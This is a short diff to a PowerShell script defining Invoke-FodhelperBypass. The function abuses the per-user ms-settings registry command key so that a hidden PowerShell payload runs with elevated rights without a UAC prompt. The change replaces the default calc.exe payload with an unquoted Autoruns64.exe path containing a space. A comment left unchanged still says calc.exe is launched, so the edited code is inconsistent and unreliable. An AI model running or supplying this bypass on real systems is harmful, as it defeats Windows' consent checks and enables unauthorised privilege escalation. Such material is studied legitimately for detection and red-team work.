@@ -1,6 +1,6 @@
 function Invoke-FodhelperBypass {
     param(
-        [string]$payload = "powershell -windowstyle hidden -Command `"Start-Process calc.exe`""
+        [string]$payload = "powershell -windowstyle hidden -Command `"Start-Process C:\Program Files\Autoruns\Autoruns64.exe`""
     )
 
     $regPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
@@ -25,3 +25,4 @@ function Invoke-FodhelperBypass {
 
 # EXEMPLE : lance calc.exe élevé
 Invoke-FodhelperBypass
+
